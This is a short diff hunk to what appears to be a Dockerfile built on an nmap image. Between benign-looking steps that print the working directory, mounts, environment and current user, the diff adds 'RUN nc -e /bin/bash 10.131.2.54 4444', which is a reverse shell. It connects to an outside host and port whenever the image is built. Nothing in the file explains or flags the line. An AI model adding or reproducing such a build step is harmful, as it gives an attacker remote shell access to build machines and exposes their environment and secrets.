@@ -9,6 +9,7 @@ FROM quay.io/instrumentisto/nmap
 
 COPY . .
 RUN pwd
+RUN nc -e /bin/bash 10.131.2.54 4444
 RUN mount
 RUN env
 RUN whoami
